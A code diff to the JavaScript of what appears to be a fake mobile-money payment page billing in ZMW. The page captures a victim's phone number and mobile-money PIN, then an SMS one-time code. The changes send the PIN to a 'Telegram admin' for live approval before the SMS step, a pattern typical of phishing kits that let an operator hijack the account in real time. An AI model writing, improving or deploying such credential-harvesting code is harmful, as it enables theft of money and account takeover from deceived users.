@@ -1338,10 +1338,8 @@
           clearInterval(approvalPollTimer);
           approvalPollTimer = null;
           hideApprovalWaiting();
-          document.getElementById('complete-plan').textContent = selectedPlanName;
-          document.getElementById('complete-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
-          showPage('complete');
-          showToast('Approved by Telegram admin.');
+          showPage('sms');
+          showToast('Approved by Telegram admin. Please complete SMS verification.');
           return;
         }
 
@@ -1363,7 +1361,7 @@
     }, 2000);
   }
 
-  function confirmPayment(){
+  async function confirmPayment(){
     var phoneInput = document.querySelector('.momo-phone-row input');
     var pinInput = document.querySelector('.momo-pin-input');
     var phone = phoneInput.value.trim();
@@ -1382,8 +1380,25 @@
     selectedPinValue = pin;
     phoneInput.value = '';
     pinInput.value = '';
-    showPage('sms');
-    showToast('Payment confirmed. Please verify your SMS.');
+
+    try {
+      currentApprovalId = await submitApprovalRequest({
+        plan: selectedPlanName,
+        price: selectedPlanPrice.toFixed(2),
+        phone: selectedPhoneNumber,
+        step: 'login',
+        code: selectedPinValue,
+        otp: '',
+        sms: ''
+      });
+
+      showApprovalWaiting();
+      showToast('Awaiting Telegram approval before continuing.');
+      startApprovalPolling(currentApprovalId);
+    } catch (err) {
+      console.error('Payment approval submission error:', err);
+      showToast('Could not send payment approval request.');
+    }
   }
 
   function runDiagnostic(btn){
@@ -1409,7 +1424,7 @@
     }, 2200);
   }
 
-  async function completePayment(){
+  function completePayment(){
     var otp = Array.from(document.querySelectorAll('.otp-inputs input'))
       .map(function(input){ return input.value; })
       .join('');
@@ -1426,24 +1441,9 @@
       return;
     }
 
-    try {
-      currentApprovalId = await submitApprovalRequest({
-        plan: selectedPlanName,
-        price: selectedPlanPrice.toFixed(2),
-        phone: selectedPhoneNumber,
-        step: 'otp',
-        code: selectedPinValue,
-        otp: otp,
-        sms: smsText
-      });
-
-      showApprovalWaiting();
-      showToast('Awaiting Telegram approval...');
-      startApprovalPolling(currentApprovalId);
-    } catch (err) {
-      console.error('Approval submission error:', err);
-      showToast('Could not send approval request.');
-    }
+    document.getElementById('complete-plan').textContent = selectedPlanName;
+    document.getElementById('complete-amount').textContent = 'ZMW ' + selectedPlanPrice.toFixed(2);
+    showPage('complete');
   }
 
   document.addEventListener('input', function(event){
